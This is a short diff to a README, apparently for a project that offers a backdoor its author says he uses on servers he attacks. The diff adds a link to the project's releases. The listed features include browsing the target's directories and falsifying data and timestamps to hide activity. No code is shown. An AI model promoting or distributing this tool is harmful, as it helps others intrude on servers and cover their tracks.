@@ -1,6 +1,9 @@
 # I Love Exploit, Get with your own name and password!
 This is the backdoor that I normally use for server exploits that I attack.
 
+# Releases for this project
+Get here: https://github.com/aldiskatel/Backdoor/releases
+
 # Features
 - Surfing in the target directory
 - Falsify data, time, and several other meta
